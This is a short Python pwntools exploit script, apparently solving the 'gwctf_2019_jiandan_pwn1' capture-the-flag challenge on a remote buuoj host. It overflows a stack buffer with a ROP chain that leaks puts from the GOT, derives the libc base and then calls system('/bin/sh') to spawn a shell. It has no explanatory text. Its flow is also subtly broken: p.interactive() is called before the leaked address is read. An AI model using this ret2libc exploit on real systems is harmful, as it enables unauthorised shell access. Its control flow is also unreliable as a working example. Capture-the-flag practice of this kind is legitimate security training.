from pwn import *
p = remote('node3.buuoj.cn',26025)
elf = ELF('./gwctf_2019_jiandan_pwn1')
libc = ELF('./libc-2.23.so')


sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

main = 0x4007BF
pop_rdi = 0x400873
pop_rsi_r15 = 0x400871
pay = 0x10c*'a' + '\x18'
pay += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(main)
# gdb.attach(p,"b *0x40068E")
p.sendline(pay)
p.interactive()
puts_addr = u64(rc(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search("/bin/sh").next()
log.success("puts_addr --> %s",hex(puts_addr))

pay = 0x10c*'a' + '\x18'
pay += p64(pop_rdi) + p64(binsh)
pay += p64(system)
# gdb.attach(p,"b *0x40068E")
p.sendline(pay)
p.interactive()